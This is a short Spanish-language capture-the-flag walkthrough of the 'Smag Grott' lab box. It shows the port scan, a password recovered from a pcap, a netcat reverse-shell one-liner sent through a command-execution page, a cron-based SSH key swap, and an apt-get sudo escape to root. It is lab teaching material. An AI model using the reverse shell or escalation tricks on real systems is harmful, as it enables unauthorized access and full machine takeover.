# Smag Grott
## Initial Scan 
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
```
## Enum 
### HTTP
#### Gobusting
```
/mail (Status: 301)
```
En el directorio encontramos un pcap del servidor y al menos 3 usuarios: uzi , jake , netadmin , en el fuente encontramos un cuarto user trodd

Mirando el pcap obtenemos lo siguiente siguiendo el TCP stream
```
username=helpdesk&password=cH4nG3M3_n0w
```
Vamos a probar este en el SSH y parece que no funciona, mirando mas el pcap vemos que tenemos un endopint no accesbile desde la nuestra máquina, mirando mas vemos que el acceso es mediante el host, añadamos el host encontrado a /etc/hosts
```
development.smag.thm
```
Si accedemos a la página con las anteriores creds veremos que tenemos un endpoit para ejecutar comandos pero sin el output en esa pagina por lo que parece, ejecutemos una revshell a ver si hay suerte
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 1234 >/tmp/f
```
Con esa estamos dentro

## Privesc
Mirando el crontab
```
*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```
Podemos explotar esto cambiando esa clave publica por una nuestra, para ello generamos un par de clave en local y sustituimos la  publica remota por la nuestra 

Una vez que nos logeamso por ssh usando la clave como Jake podemos ver que podemos ejecutar cosas como sudo
```
User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```
Ejecutamos lo siguiente:
```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
Tenemos shell as root
